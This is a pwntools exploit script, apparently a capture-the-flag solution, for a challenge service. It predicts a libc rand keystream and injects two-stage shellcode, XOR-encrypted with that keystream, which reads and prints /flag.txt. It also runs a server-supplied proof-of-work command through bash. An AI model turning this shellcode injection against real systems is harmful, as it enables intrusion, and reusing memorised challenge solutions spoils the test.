#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import math
import ctypes

context.arch = "amd64"
libc = ctypes.CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(0)


def handle_pow(r):
    r.recvline()
    challenge = r.recvline().decode('ascii').strip()
    log.info(f'Solving pow -> {challenge}')
    p = pwnlib.tubes.process.process(['bash', '-c', challenge])
    solution = p.recvline().strip()
    p.close()
    r.recvuntil(b'solution: ')
    r.sendline(solution)


def start():
    for _ in range(10):
        try:
            sleep(1)
            io = pwnlib.tubes.remote.remote('challenge', 1337)
            tmp_data = io.recv(len('proof'), timeout=2)
            if tmp_data == b'proof':
                handle_pow(io)
            else:
                io.unrecv(tmp_data)
            return io
        except:
            continue
    raise ValueError()


def randnum():
    num = 0
    for _ in range(8):
        num = (num << 8) | (libc.rand() & 0xff)
    return num


def encrypt_payload(payload, length):
    res = []
    for i in range(length):
        key = (randnum() << (8 * ((7 - i) % 8))) & 0xffffffffffffffff
        num = u64(payload[i * 8:(i + 1) * 8])
        res.append(num ^ key)
    return res


p = start()
p.recvuntil(b": ")
offset = int(p.recvline().strip(), 16)
log.info(f"Offset: {hex(offset)}")

# Stage 1: change srand seed to 0
sc1 = f"""
    xor edi, edi
    call ${-(offset + 8 + 2 - 139)}
"""
payload1 = asm(sc1)
payload1 = payload1.ljust(0x8, b"\x90")
p.sendlineafter(b"number: ", b"1")
p.sendlineafter(b"> ", str(u64(payload1)).encode())

# Stage 2
sc2 = shellcraft.linux.openat(-100, "/flag.txt")
sc2 += shellcraft.linux.read("rax", "rsp", 0x30)
sc2 += shellcraft.linux.write(1, "rsp", 0x30)
payload2 = asm(sc2)
length = math.ceil(len(payload2) / 8)
payload2 = payload2.ljust(length * 8, b"\x90")
payload2 = encrypt_payload(payload2, length)

p.sendlineafter(b"number: ", str(length).encode())
for i in payload2:
    p.sendlineafter(b"> ", str(i).encode())

print(p.recvuntil(b"}"))

p.close()
exit(0)
